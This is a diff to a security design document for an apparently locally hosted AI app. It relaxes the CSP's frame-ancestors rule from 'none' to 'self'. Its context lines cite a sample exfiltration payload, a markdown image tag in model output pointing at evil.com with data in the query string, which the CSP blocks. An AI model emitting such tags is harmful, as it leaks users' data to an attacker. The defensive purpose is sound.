@@ -1458,7 +1458,9 @@ page the user has open can send requests to `127.0.0.1`. Required, not optional:
   manually. Token via `Sec-WebSocket-Protocol` or a mandatory first message with a 2s
   timeout.
 - **Strict CSP**: `default-src 'none'; script-src 'self'; img-src 'self' data:;
-  connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'`.
+  connect-src 'self'; frame-ancestors 'self'; base-uri 'none'; form-action 'none'`.
+  *(`frame-ancestors` was `'none'` as originally specified and is `'self'` since 0.68.0 — see
+  `apps/host/src/security.ts` for why same-origin framing is not the attack it guards against.)*
   The `img-src` and `connect-src` restrictions block the classic exfiltration trick where
   model output contains `<img src="https://evil.com/?d=...">`.
 - Sanitize markdown rendering (DOMPurify, no raw HTML, `rel="noopener noreferrer"`).
